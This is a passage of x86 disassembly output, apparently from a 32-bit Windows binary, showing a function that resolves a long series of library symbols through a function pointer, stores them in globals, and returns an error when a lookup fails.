  402e90:	57                   	push   %edi
  402e91:	56                   	push   %esi
  402e92:	53                   	push   %ebx
  402e93:	83 ec 10             	sub    $0x10,%esp
  402e96:	8b 1d 40 e2 41 00    	mov    0x41e240,%ebx
  402e9c:	8b 74 24 20          	mov    0x20(%esp),%esi
  402ea0:	8b 7c 24 24          	mov    0x24(%esp),%edi
  402ea4:	c7 44 24 04 5c c3 40 	movl   $0x40c35c,0x4(%esp)
  402eab:	00 
  402eac:	89 34 24             	mov    %esi,(%esp)
  402eaf:	ff d3                	call   *%ebx
  402eb1:	83 ec 08             	sub    $0x8,%esp
  402eb4:	85 c0                	test   %eax,%eax
  402eb6:	a3 dc 10 41 00       	mov    %eax,0x4110dc
  402ebb:	0f 84 00 06 00 00    	je     0x4034c1
  402ec1:	c7 44 24 04 ac c3 40 	movl   $0x40c3ac,0x4(%esp)
  402ec8:	00 
  402ec9:	89 34 24             	mov    %esi,(%esp)
  402ecc:	ff d3                	call   *%ebx
  402ece:	83 ec 08             	sub    $0x8,%esp
  402ed1:	85 c0                	test   %eax,%eax
  402ed3:	a3 d8 10 41 00       	mov    %eax,0x4110d8
  402ed8:	0f 84 f9 05 00 00    	je     0x4034d7
  402ede:	c7 44 24 04 04 c4 40 	movl   $0x40c404,0x4(%esp)
  402ee5:	00 
  402ee6:	89 34 24             	mov    %esi,(%esp)
  402ee9:	ff d3                	call   *%ebx
  402eeb:	83 ec 08             	sub    $0x8,%esp
  402eee:	85 c0                	test   %eax,%eax
  402ef0:	a3 d4 10 41 00       	mov    %eax,0x4110d4
  402ef5:	0f 84 f2 05 00 00    	je     0x4034ed
  402efb:	c7 44 24 04 3d c4 40 	movl   $0x40c43d,0x4(%esp)
  402f02:	00 
  402f03:	89 34 24             	mov    %esi,(%esp)
  402f06:	ff d3                	call   *%ebx
  402f08:	83 ec 08             	sub    $0x8,%esp
  402f0b:	85 c0                	test   %eax,%eax
  402f0d:	a3 d0 10 41 00       	mov    %eax,0x4110d0
  402f12:	0f 84 eb 05 00 00    	je     0x403503
  402f18:	c7 44 24 04 8c c4 40 	movl   $0x40c48c,0x4(%esp)
  402f1f:	00 
  402f20:	89 34 24             	mov    %esi,(%esp)
  402f23:	ff d3                	call   *%ebx
  402f25:	83 ec 08             	sub    $0x8,%esp
  402f28:	85 c0                	test   %eax,%eax
  402f2a:	a3 cc 10 41 00       	mov    %eax,0x4110cc
  402f2f:	0f 84 e4 05 00 00    	je     0x403519
  402f35:	c7 44 24 04 c5 c4 40 	movl   $0x40c4c5,0x4(%esp)
  402f3c:	00 
  402f3d:	89 34 24             	mov    %esi,(%esp)
  402f40:	ff d3                	call   *%ebx
  402f42:	83 ec 08             	sub    $0x8,%esp
  402f45:	85 c0                	test   %eax,%eax
  402f47:	a3 c8 10 41 00       	mov    %eax,0x4110c8
  402f4c:	0f 84 dd 05 00 00    	je     0x40352f
  402f52:	c7 44 24 04 0e c5 40 	movl   $0x40c50e,0x4(%esp)
  402f59:	00 
  402f5a:	89 34 24             	mov    %esi,(%esp)
  402f5d:	ff d3                	call   *%ebx
  402f5f:	83 ec 08             	sub    $0x8,%esp
  402f62:	85 c0                	test   %eax,%eax
  402f64:	a3 c4 10 41 00       	mov    %eax,0x4110c4
  402f69:	0f 84 d6 05 00 00    	je     0x403545
  402f6f:	c7 44 24 04 4b c5 40 	movl   $0x40c54b,0x4(%esp)
  402f76:	00 
  402f77:	89 34 24             	mov    %esi,(%esp)
  402f7a:	ff d3                	call   *%ebx
  402f7c:	83 ec 08             	sub    $0x8,%esp
  402f7f:	85 c0                	test   %eax,%eax
  402f81:	a3 c0 10 41 00       	mov    %eax,0x4110c0
  402f86:	0f 84 cf 05 00 00    	je     0x40355b
  402f8c:	c7 44 24 04 86 c5 40 	movl   $0x40c586,0x4(%esp)
  402f93:	00 
  402f94:	89 34 24             	mov    %esi,(%esp)
  402f97:	ff d3                	call   *%ebx
  402f99:	83 ec 08             	sub    $0x8,%esp
  402f9c:	85 c0                	test   %eax,%eax
  402f9e:	a3 bc 10 41 00       	mov    %eax,0x4110bc
  402fa3:	0f 84 c8 05 00 00    	je     0x403571
  402fa9:	c7 44 24 04 bd c5 40 	movl   $0x40c5bd,0x4(%esp)
  402fb0:	00 
  402fb1:	89 34 24             	mov    %esi,(%esp)
  402fb4:	ff d3                	call   *%ebx
  402fb6:	83 ec 08             	sub    $0x8,%esp
  402fb9:	85 c0                	test   %eax,%eax
  402fbb:	a3 b8 10 41 00       	mov    %eax,0x4110b8
  402fc0:	0f 84 c1 05 00 00    	je     0x403587
  402fc6:	c7 44 24 04 ed c5 40 	movl   $0x40c5ed,0x4(%esp)
  402fcd:	00 
  402fce:	89 34 24             	mov    %esi,(%esp)
  402fd1:	ff d3                	call   *%ebx
  402fd3:	83 ec 08             	sub    $0x8,%esp
  402fd6:	85 c0                	test   %eax,%eax
  402fd8:	a3 b4 10 41 00       	mov    %eax,0x4110b4
  402fdd:	0f 84 ba 05 00 00    	je     0x40359d
  402fe3:	c7 44 24 04 2d c6 40 	movl   $0x40c62d,0x4(%esp)
  402fea:	00 
  402feb:	89 34 24             	mov    %esi,(%esp)
  402fee:	ff d3                	call   *%ebx
  402ff0:	83 ec 08             	sub    $0x8,%esp
  402ff3:	85 c0                	test   %eax,%eax
  402ff5:	a3 b0 10 41 00       	mov    %eax,0x4110b0
  402ffa:	0f 84 b3 05 00 00    	je     0x4035b3
  403000:	c7 44 24 04 63 c6 40 	movl   $0x40c663,0x4(%esp)
  403007:	00 
  403008:	89 34 24             	mov    %esi,(%esp)
  40300b:	ff d3                	call   *%ebx
  40300d:	83 ec 08             	sub    $0x8,%esp
  403010:	85 c0                	test   %eax,%eax
  403012:	a3 ac 10 41 00       	mov    %eax,0x4110ac
  403017:	0f 84 ac 05 00 00    	je     0x4035c9
  40301d:	c7 44 24 04 95 c6 40 	movl   $0x40c695,0x4(%esp)
  403024:	00 
  403025:	89 34 24             	mov    %esi,(%esp)
  403028:	ff d3                	call   *%ebx
  40302a:	83 ec 08             	sub    $0x8,%esp
  40302d:	85 c0                	test   %eax,%eax
  40302f:	a3 a8 10 41 00       	mov    %eax,0x4110a8
  403034:	0f 84 bb 05 00 00    	je     0x4035f5
  40303a:	c7 44 24 04 cd c6 40 	movl   $0x40c6cd,0x4(%esp)
  403041:	00 
  403042:	89 34 24             	mov    %esi,(%esp)
  403045:	ff d3                	call   *%ebx
  403047:	83 ec 08             	sub    $0x8,%esp
  40304a:	85 c0                	test   %eax,%eax
  40304c:	a3 a4 10 41 00       	mov    %eax,0x4110a4
  403051:	0f 84 ae 07 00 00    	je     0x403805
  403057:	83 ff 1d             	cmp    $0x1d,%edi
  40305a:	0f 8f f0 02 00 00    	jg     0x403350
  403060:	c7 44 24 04 3e c7 40 	movl   $0x40c73e,0x4(%esp)
  403067:	00 
  403068:	89 34 24             	mov    %esi,(%esp)
  40306b:	ff d3                	call   *%ebx
  40306d:	83 ec 08             	sub    $0x8,%esp
  403070:	85 c0                	test   %eax,%eax
  403072:	a3 9c 10 41 00       	mov    %eax,0x41109c
  403077:	0f 84 62 05 00 00    	je     0x4035df
  40307d:	c7 44 24 04 7d c7 40 	movl   $0x40c77d,0x4(%esp)
  403084:	00 
  403085:	89 34 24             	mov    %esi,(%esp)
  403088:	ff d3                	call   *%ebx
  40308a:	83 ec 08             	sub    $0x8,%esp
  40308d:	85 c0                	test   %eax,%eax
  40308f:	a3 98 10 41 00       	mov    %eax,0x411098
  403094:	0f 84 87 05 00 00    	je     0x403621
  40309a:	c7 44 24 04 bc c7 40 	movl   $0x40c7bc,0x4(%esp)
  4030a1:	00 
  4030a2:	89 34 24             	mov    %esi,(%esp)
  4030a5:	ff d3                	call   *%ebx
  4030a7:	83 ec 08             	sub    $0x8,%esp
  4030aa:	85 c0                	test   %eax,%eax
  4030ac:	a3 94 10 41 00       	mov    %eax,0x411094
  4030b1:	0f 84 54 05 00 00    	je     0x40360b
  4030b7:	c7 44 24 04 04 c8 40 	movl   $0x40c804,0x4(%esp)
  4030be:	00 
  4030bf:	89 34 24             	mov    %esi,(%esp)
  4030c2:	ff d3                	call   *%ebx
  4030c4:	83 ec 08             	sub    $0x8,%esp
  4030c7:	85 c0                	test   %eax,%eax
  4030c9:	a3 90 10 41 00       	mov    %eax,0x411090
  4030ce:	0f 84 79 05 00 00    	je     0x40364d
  4030d4:	c7 44 24 04 37 c8 40 	movl   $0x40c837,0x4(%esp)
  4030db:	00 
  4030dc:	89 34 24             	mov    %esi,(%esp)
  4030df:	ff d3                	call   *%ebx
  4030e1:	83 ec 08             	sub    $0x8,%esp
  4030e4:	85 c0                	test   %eax,%eax
  4030e6:	a3 8c 10 41 00       	mov    %eax,0x41108c
  4030eb:	0f 84 46 05 00 00    	je     0x403637
  4030f1:	c7 44 24 04 72 c8 40 	movl   $0x40c872,0x4(%esp)
  4030f8:	00 
  4030f9:	89 34 24             	mov    %esi,(%esp)
  4030fc:	ff d3                	call   *%ebx
  4030fe:	83 ec 08             	sub    $0x8,%esp
  403101:	85 c0                	test   %eax,%eax
  403103:	a3 88 10 41 00       	mov    %eax,0x411088
  403108:	0f 84 6b 05 00 00    	je     0x403679
  40310e:	c7 44 24 04 a7 c8 40 	movl   $0x40c8a7,0x4(%esp)
  403115:	00 
  403116:	89 34 24             	mov    %esi,(%esp)
  403119:	ff d3                	call   *%ebx
  40311b:	83 ec 08             	sub    $0x8,%esp
  40311e:	85 c0                	test   %eax,%eax
  403120:	a3 84 10 41 00       	mov    %eax,0x411084
  403125:	0f 84 38 05 00 00    	je     0x403663
  40312b:	c7 44 24 04 ec c8 40 	movl   $0x40c8ec,0x4(%esp)
  403132:	00 
  403133:	89 34 24             	mov    %esi,(%esp)
  403136:	ff d3                	call   *%ebx
  403138:	83 ec 08             	sub    $0x8,%esp
  40313b:	85 c0                	test   %eax,%eax
  40313d:	a3 80 10 41 00       	mov    %eax,0x411080
  403142:	0f 84 5d 05 00 00    	je     0x4036a5
  403148:	c7 44 24 04 2e c9 40 	movl   $0x40c92e,0x4(%esp)
  40314f:	00 
  403150:	89 34 24             	mov    %esi,(%esp)
  403153:	ff d3                	call   *%ebx
  403155:	83 ec 08             	sub    $0x8,%esp
  403158:	85 c0                	test   %eax,%eax
  40315a:	a3 7c 10 41 00       	mov    %eax,0x41107c
  40315f:	0f 84 2a 05 00 00    	je     0x40368f
  403165:	c7 44 24 04 74 c9 40 	movl   $0x40c974,0x4(%esp)
  40316c:	00 
  40316d:	89 34 24             	mov    %esi,(%esp)
  403170:	ff d3                	call   *%ebx
  403172:	83 ec 08             	sub    $0x8,%esp
  403175:	85 c0                	test   %eax,%eax
  403177:	a3 78 10 41 00       	mov    %eax,0x411078
  40317c:	0f 84 65 05 00 00    	je     0x4036e7
  403182:	c7 44 24 04 b6 c9 40 	movl   $0x40c9b6,0x4(%esp)
  403189:	00 
  40318a:	89 34 24             	mov    %esi,(%esp)
  40318d:	ff d3                	call   *%ebx
  40318f:	83 ec 08             	sub    $0x8,%esp
  403192:	85 c0                	test   %eax,%eax
  403194:	a3 74 10 41 00       	mov    %eax,0x411074
  403199:	0f 84 32 05 00 00    	je     0x4036d1
  40319f:	c7 44 24 04 03 ca 40 	movl   $0x40ca03,0x4(%esp)
  4031a6:	00 
  4031a7:	89 34 24             	mov    %esi,(%esp)
  4031aa:	ff d3                	call   *%ebx
  4031ac:	83 ec 08             	sub    $0x8,%esp
  4031af:	85 c0                	test   %eax,%eax
  4031b1:	a3 70 10 41 00       	mov    %eax,0x411070
  4031b6:	0f 84 ff 04 00 00    	je     0x4036bb
  4031bc:	c7 44 24 04 4d ca 40 	movl   $0x40ca4d,0x4(%esp)
  4031c3:	00 
  4031c4:	89 34 24             	mov    %esi,(%esp)
  4031c7:	ff d3                	call   *%ebx
  4031c9:	83 ec 08             	sub    $0x8,%esp
  4031cc:	85 c0                	test   %eax,%eax
  4031ce:	a3 6c 10 41 00       	mov    %eax,0x41106c
  4031d3:	0f 84 24 05 00 00    	je     0x4036fd
  4031d9:	c7 44 24 04 85 ca 40 	movl   $0x40ca85,0x4(%esp)
  4031e0:	00 
  4031e1:	89 34 24             	mov    %esi,(%esp)
  4031e4:	ff d3                	call   *%ebx
  4031e6:	83 ec 08             	sub    $0x8,%esp
  4031e9:	85 c0                	test   %eax,%eax
  4031eb:	a3 68 10 41 00       	mov    %eax,0x411068
  4031f0:	0f 84 1d 05 00 00    	je     0x403713
  4031f6:	c7 44 24 04 b6 ca 40 	movl   $0x40cab6,0x4(%esp)
  4031fd:	00 
  4031fe:	89 34 24             	mov    %esi,(%esp)
  403201:	ff d3                	call   *%ebx
  403203:	83 ec 08             	sub    $0x8,%esp
  403206:	85 c0                	test   %eax,%eax
  403208:	a3 64 10 41 00       	mov    %eax,0x411064
  40320d:	0f 84 16 05 00 00    	je     0x403729
  403213:	c7 44 24 04 ed ca 40 	movl   $0x40caed,0x4(%esp)
  40321a:	00 
  40321b:	89 34 24             	mov    %esi,(%esp)
  40321e:	ff d3                	call   *%ebx
  403220:	83 ec 08             	sub    $0x8,%esp
  403223:	85 c0                	test   %eax,%eax
  403225:	a3 60 10 41 00       	mov    %eax,0x411060
  40322a:	0f 84 0f 05 00 00    	je     0x40373f
  403230:	c7 44 24 04 2c cb 40 	movl   $0x40cb2c,0x4(%esp)
  403237:	00 
  403238:	89 34 24             	mov    %esi,(%esp)
  40323b:	ff d3                	call   *%ebx
  40323d:	83 ec 08             	sub    $0x8,%esp
  403240:	85 c0                	test   %eax,%eax
  403242:	a3 5c 10 41 00       	mov    %eax,0x41105c
  403247:	0f 84 08 05 00 00    	je     0x403755
  40324d:	c7 44 24 04 75 cb 40 	movl   $0x40cb75,0x4(%esp)
  403254:	00 
  403255:	89 34 24             	mov    %esi,(%esp)
  403258:	ff d3                	call   *%ebx
  40325a:	83 ec 08             	sub    $0x8,%esp
  40325d:	85 c0                	test   %eax,%eax
  40325f:	a3 58 10 41 00       	mov    %eax,0x411058
  403264:	0f 84 01 05 00 00    	je     0x40376b
  40326a:	c7 44 24 04 be cb 40 	movl   $0x40cbbe,0x4(%esp)
  403271:	00 
  403272:	89 34 24             	mov    %esi,(%esp)
  403275:	ff d3                	call   *%ebx
  403277:	83 ec 08             	sub    $0x8,%esp
  40327a:	85 c0                	test   %eax,%eax
  40327c:	a3 54 10 41 00       	mov    %eax,0x411054
  403281:	0f 84 94 05 00 00    	je     0x40381b
  403287:	83 ff 1d             	cmp    $0x1d,%edi
  40328a:	0f 8e f0 00 00 00    	jle    0x403380
  403290:	c7 44 24 04 8b cc 40 	movl   $0x40cc8b,0x4(%esp)
  403297:	00 
  403298:	89 34 24             	mov    %esi,(%esp)
  40329b:	ff d3                	call   *%ebx
  40329d:	83 ec 08             	sub    $0x8,%esp
  4032a0:	85 c0                	test   %eax,%eax
  4032a2:	a3 4c 10 41 00       	mov    %eax,0x41104c
  4032a7:	0f 84 d4 04 00 00    	je     0x403781
  4032ad:	c7 44 24 04 cf cc 40 	movl   $0x40cccf,0x4(%esp)
  4032b4:	00 
  4032b5:	89 34 24             	mov    %esi,(%esp)
  4032b8:	ff d3                	call   *%ebx
  4032ba:	83 ec 08             	sub    $0x8,%esp
  4032bd:	85 c0                	test   %eax,%eax
  4032bf:	a3 48 10 41 00       	mov    %eax,0x411048
  4032c4:	0f 84 cd 04 00 00    	je     0x403797
  4032ca:	c7 44 24 04 0b cd 40 	movl   $0x40cd0b,0x4(%esp)
  4032d1:	00 
  4032d2:	89 34 24             	mov    %esi,(%esp)
  4032d5:	ff d3                	call   *%ebx
  4032d7:	83 ec 08             	sub    $0x8,%esp
  4032da:	85 c0                	test   %eax,%eax
  4032dc:	a3 44 10 41 00       	mov    %eax,0x411044
  4032e1:	0f 84 c6 04 00 00    	je     0x4037ad
  4032e7:	c7 44 24 04 47 cd 40 	movl   $0x40cd47,0x4(%esp)
  4032ee:	00 
  4032ef:	89 34 24             	mov    %esi,(%esp)
  4032f2:	ff d3                	call   *%ebx
  4032f4:	83 ec 08             	sub    $0x8,%esp
  4032f7:	85 c0                	test   %eax,%eax
  4032f9:	a3 40 10 41 00       	mov    %eax,0x411040
  4032fe:	0f 84 bf 04 00 00    	je     0x4037c3
  403304:	c7 44 24 04 83 cd 40 	movl   $0x40cd83,0x4(%esp)
  40330b:	00 
  40330c:	89 34 24             	mov    %esi,(%esp)
  40330f:	ff d3                	call   *%ebx
  403311:	83 ec 08             	sub    $0x8,%esp
  403314:	85 c0                	test   %eax,%eax
  403316:	a3 3c 10 41 00       	mov    %eax,0x41103c
  40331b:	0f 84 b8 04 00 00    	je     0x4037d9
  403321:	c7 44 24 04 bd cd 40 	movl   $0x40cdbd,0x4(%esp)
  403328:	00 
  403329:	89 34 24             	mov    %esi,(%esp)
  40332c:	ff d3                	call   *%ebx
  40332e:	83 ec 08             	sub    $0x8,%esp
  403331:	85 c0                	test   %eax,%eax
  403333:	a3 38 10 41 00       	mov    %eax,0x411038
  403338:	0f 84 f3 04 00 00    	je     0x403831
  40333e:	83 ff 1d             	cmp    $0x1d,%edi
  403341:	0f 8f 89 00 00 00    	jg     0x4033d0
  403347:	31 c0                	xor    %eax,%eax
  403349:	83 c4 10             	add    $0x10,%esp
  40334c:	5b                   	pop    %ebx
  40334d:	5e                   	pop    %esi
  40334e:	5f                   	pop    %edi
  40334f:	c3                   	ret
  403350:	c7 44 24 04 0d c7 40 	movl   $0x40c70d,0x4(%esp)
  403357:	00 
  403358:	89 34 24             	mov    %esi,(%esp)
  40335b:	ff d3                	call   *%ebx
  40335d:	83 ec 08             	sub    $0x8,%esp
  403360:	85 c0                	test   %eax,%eax
  403362:	a3 a0 10 41 00       	mov    %eax,0x4110a0
  403367:	0f 85 f3 fc ff ff    	jne    0x403060
  40336d:	c7 04 24 18 c7 40 00 	movl   $0x40c718,(%esp)
  403374:	e8 97 ea ff ff       	call   0x401e10
  403379:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40337e:	eb c9                	jmp    0x403349
  403380:	c7 44 24 04 02 cc 40 	movl   $0x40cc02,0x4(%esp)
  403387:	00 
  403388:	89 34 24             	mov    %esi,(%esp)
  40338b:	ff d3                	call   *%ebx
  40338d:	83 ec 08             	sub    $0x8,%esp
  403390:	85 c0                	test   %eax,%eax
  403392:	a3 50 10 41 00       	mov    %eax,0x411050
  403397:	0f 84 52 04 00 00    	je     0x4037ef
  40339d:	c7 44 24 04 47 cc 40 	movl   $0x40cc47,0x4(%esp)
  4033a4:	00 
  4033a5:	89 34 24             	mov    %esi,(%esp)
  4033a8:	ff d3                	call   *%ebx
  4033aa:	83 ec 08             	sub    $0x8,%esp
  4033ad:	85 c0                	test   %eax,%eax
  4033af:	a3 2c 10 41 00       	mov    %eax,0x41102c
  4033b4:	0f 85 d6 fe ff ff    	jne    0x403290
  4033ba:	c7 04 24 5c cc 40 00 	movl   $0x40cc5c,(%esp)
  4033c1:	e8 4a ea ff ff       	call   0x401e10
  4033c6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4033cb:	e9 79 ff ff ff       	jmp    0x403349
  4033d0:	c7 44 24 04 fe cd 40 	movl   $0x40cdfe,0x4(%esp)
  4033d7:	00 
  4033d8:	89 34 24             	mov    %esi,(%esp)
  4033db:	ff d3                	call   *%ebx
  4033dd:	83 ec 08             	sub    $0x8,%esp
  4033e0:	85 c0                	test   %eax,%eax
  4033e2:	a3 34 10 41 00       	mov    %eax,0x411034
  4033e7:	0f 84 70 04 00 00    	je     0x40385d
  4033ed:	83 ff 22             	cmp    $0x22,%edi
  4033f0:	0f 8f 9a 00 00 00    	jg     0x403490
  4033f6:	c7 44 24 04 7f ce 40 	movl   $0x40ce7f,0x4(%esp)
  4033fd:	00 
  4033fe:	89 34 24             	mov    %esi,(%esp)
  403401:	ff d3                	call   *%ebx
  403403:	83 ec 08             	sub    $0x8,%esp
  403406:	85 c0                	test   %eax,%eax
  403408:	a3 30 10 41 00       	mov    %eax,0x411030
  40340d:	0f 84 72 04 00 00    	je     0x403885
  403413:	c7 44 24 04 7d cf 40 	movl   $0x40cf7d,0x4(%esp)
  40341a:	00 
  40341b:	89 34 24             	mov    %esi,(%esp)
  40341e:	ff d3                	call   *%ebx
  403420:	83 ec 08             	sub    $0x8,%esp
  403423:	85 c0                	test   %eax,%eax
  403425:	a3 28 10 41 00       	mov    %eax,0x411028
  40342a:	0f 84 17 04 00 00    	je     0x403847
  403430:	c7 44 24 04 ec ce 40 	movl   $0x40ceec,0x4(%esp)
  403437:	00 
  403438:	89 34 24             	mov    %esi,(%esp)
  40343b:	ff d3                	call   *%ebx
  40343d:	83 ec 08             	sub    $0x8,%esp
  403440:	85 c0                	test   %eax,%eax
  403442:	a3 20 10 41 00       	mov    %eax,0x411020
  403447:	0f 84 24 04 00 00    	je     0x403871
  40344d:	83 ff 1f             	cmp    $0x1f,%edi
  403450:	0f 8e f1 fe ff ff    	jle    0x403347
  403456:	c7 44 24 04 2c cf 40 	movl   $0x40cf2c,0x4(%esp)
  40345d:	00 
  40345e:	89 34 24             	mov    %esi,(%esp)
  403461:	ff d3                	call   *%ebx
  403463:	83 ec 08             	sub    $0x8,%esp
  403466:	85 c0                	test   %eax,%eax
  403468:	a3 24 10 41 00       	mov    %eax,0x411024
  40346d:	0f 85 d4 fe ff ff    	jne    0x403347
  403473:	c7 04 24 48 cf 40 00 	movl   $0x40cf48,(%esp)
  40347a:	e8 91 e9 ff ff       	call   0x401e10
  40347f:	83 c8 ff             	or     $0xffffffff,%eax
  403482:	e9 c2 fe ff ff       	jmp    0x403349
  403487:	89 f6                	mov    %esi,%esi
  403489:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  403490:	c7 44 24 04 44 ce 40 	movl   $0x40ce44,0x4(%esp)
  403497:	00 
  403498:	89 34 24             	mov    %esi,(%esp)
  40349b:	ff d3                	call   *%ebx
  40349d:	83 ec 08             	sub    $0x8,%esp
  4034a0:	85 c0                	test   %eax,%eax
  4034a2:	a3 30 10 41 00       	mov    %eax,0x411030
  4034a7:	0f 85 66 ff ff ff    	jne    0x403413
  4034ad:	c7 04 24 54 ce 40 00 	movl   $0x40ce54,(%esp)
  4034b4:	e8 57 e9 ff ff       	call   0x401e10
  4034b9:	83 c8 ff             	or     $0xffffffff,%eax
  4034bc:	e9 88 fe ff ff       	jmp    0x403349
  4034c1:	c7 04 24 78 c3 40 00 	movl   $0x40c378,(%esp)
  4034c8:	e8 43 e9 ff ff       	call   0x401e10
  4034cd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4034d2:	e9 72 fe ff ff       	jmp    0x403349
  4034d7:	c7 04 24 cc c3 40 00 	movl   $0x40c3cc,(%esp)
  4034de:	e8 2d e9 ff ff       	call   0x401e10
  4034e3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4034e8:	e9 5c fe ff ff       	jmp    0x403349
  4034ed:	c7 04 24 14 c4 40 00 	movl   $0x40c414,(%esp)
  4034f4:	e8 17 e9 ff ff       	call   0x401e10
  4034f9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4034fe:	e9 46 fe ff ff       	jmp    0x403349
  403503:	c7 04 24 58 c4 40 00 	movl   $0x40c458,(%esp)
  40350a:	e8 01 e9 ff ff       	call   0x401e10
  40350f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403514:	e9 30 fe ff ff       	jmp    0x403349
  403519:	c7 04 24 9c c4 40 00 	movl   $0x40c49c,(%esp)
  403520:	e8 eb e8 ff ff       	call   0x401e10
  403525:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40352a:	e9 1a fe ff ff       	jmp    0x403349
  40352f:	c7 04 24 dc c4 40 00 	movl   $0x40c4dc,(%esp)
  403536:	e8 d5 e8 ff ff       	call   0x401e10
  40353b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403540:	e9 04 fe ff ff       	jmp    0x403349
  403545:	c7 04 24 20 c5 40 00 	movl   $0x40c520,(%esp)
  40354c:	e8 bf e8 ff ff       	call   0x401e10
  403551:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403556:	e9 ee fd ff ff       	jmp    0x403349
  40355b:	c7 04 24 5c c5 40 00 	movl   $0x40c55c,(%esp)
  403562:	e8 a9 e8 ff ff       	call   0x401e10
  403567:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40356c:	e9 d8 fd ff ff       	jmp    0x403349
  403571:	c7 04 24 94 c5 40 00 	movl   $0x40c594,(%esp)
  403578:	e8 93 e8 ff ff       	call   0x401e10
  40357d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403582:	e9 c2 fd ff ff       	jmp    0x403349
  403587:	c7 04 24 c8 c5 40 00 	movl   $0x40c5c8,(%esp)
  40358e:	e8 7d e8 ff ff       	call   0x401e10
  403593:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403598:	e9 ac fd ff ff       	jmp    0x403349
  40359d:	c7 04 24 00 c6 40 00 	movl   $0x40c600,(%esp)
  4035a4:	e8 67 e8 ff ff       	call   0x401e10
  4035a9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035ae:	e9 96 fd ff ff       	jmp    0x403349
  4035b3:	c7 04 24 3c c6 40 00 	movl   $0x40c63c,(%esp)
  4035ba:	e8 51 e8 ff ff       	call   0x401e10
  4035bf:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035c4:	e9 80 fd ff ff       	jmp    0x403349
  4035c9:	c7 04 24 70 c6 40 00 	movl   $0x40c670,(%esp)
  4035d0:	e8 3b e8 ff ff       	call   0x401e10
  4035d5:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035da:	e9 6a fd ff ff       	jmp    0x403349
  4035df:	c7 04 24 50 c7 40 00 	movl   $0x40c750,(%esp)
  4035e6:	e8 25 e8 ff ff       	call   0x401e10
  4035eb:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4035f0:	e9 54 fd ff ff       	jmp    0x403349
  4035f5:	c7 04 24 a4 c6 40 00 	movl   $0x40c6a4,(%esp)
  4035fc:	e8 0f e8 ff ff       	call   0x401e10
  403601:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403606:	e9 3e fd ff ff       	jmp    0x403349
  40360b:	c7 04 24 d4 c7 40 00 	movl   $0x40c7d4,(%esp)
  403612:	e8 f9 e7 ff ff       	call   0x401e10
  403617:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40361c:	e9 28 fd ff ff       	jmp    0x403349
  403621:	c7 04 24 90 c7 40 00 	movl   $0x40c790,(%esp)
  403628:	e8 e3 e7 ff ff       	call   0x401e10
  40362d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403632:	e9 12 fd ff ff       	jmp    0x403349
  403637:	c7 04 24 48 c8 40 00 	movl   $0x40c848,(%esp)
  40363e:	e8 cd e7 ff ff       	call   0x401e10
  403643:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403648:	e9 fc fc ff ff       	jmp    0x403349
  40364d:	c7 04 24 10 c8 40 00 	movl   $0x40c810,(%esp)
  403654:	e8 b7 e7 ff ff       	call   0x401e10
  403659:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40365e:	e9 e6 fc ff ff       	jmp    0x403349
  403663:	c7 04 24 bc c8 40 00 	movl   $0x40c8bc,(%esp)
  40366a:	e8 a1 e7 ff ff       	call   0x401e10
  40366f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403674:	e9 d0 fc ff ff       	jmp    0x403349
  403679:	c7 04 24 80 c8 40 00 	movl   $0x40c880,(%esp)
  403680:	e8 8b e7 ff ff       	call   0x401e10
  403685:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40368a:	e9 ba fc ff ff       	jmp    0x403349
  40368f:	c7 04 24 44 c9 40 00 	movl   $0x40c944,(%esp)
  403696:	e8 75 e7 ff ff       	call   0x401e10
  40369b:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036a0:	e9 a4 fc ff ff       	jmp    0x403349
  4036a5:	c7 04 24 00 c9 40 00 	movl   $0x40c900,(%esp)
  4036ac:	e8 5f e7 ff ff       	call   0x401e10
  4036b1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036b6:	e9 8e fc ff ff       	jmp    0x403349
  4036bb:	c7 04 24 1c ca 40 00 	movl   $0x40ca1c,(%esp)
  4036c2:	e8 49 e7 ff ff       	call   0x401e10
  4036c7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036cc:	e9 78 fc ff ff       	jmp    0x403349
  4036d1:	c7 04 24 d0 c9 40 00 	movl   $0x40c9d0,(%esp)
  4036d8:	e8 33 e7 ff ff       	call   0x401e10
  4036dd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036e2:	e9 62 fc ff ff       	jmp    0x403349
  4036e7:	c7 04 24 88 c9 40 00 	movl   $0x40c988,(%esp)
  4036ee:	e8 1d e7 ff ff       	call   0x401e10
  4036f3:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4036f8:	e9 4c fc ff ff       	jmp    0x403349
  4036fd:	c7 04 24 5c ca 40 00 	movl   $0x40ca5c,(%esp)
  403704:	e8 07 e7 ff ff       	call   0x401e10
  403709:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40370e:	e9 36 fc ff ff       	jmp    0x403349
  403713:	c7 04 24 90 ca 40 00 	movl   $0x40ca90,(%esp)
  40371a:	e8 f1 e6 ff ff       	call   0x401e10
  40371f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  403724:	e9 20 fc ff ff       	jmp    0x403349
  403729:	c7 04 24 c4 ca 40 00 	movl   $0x40cac4,(%esp)
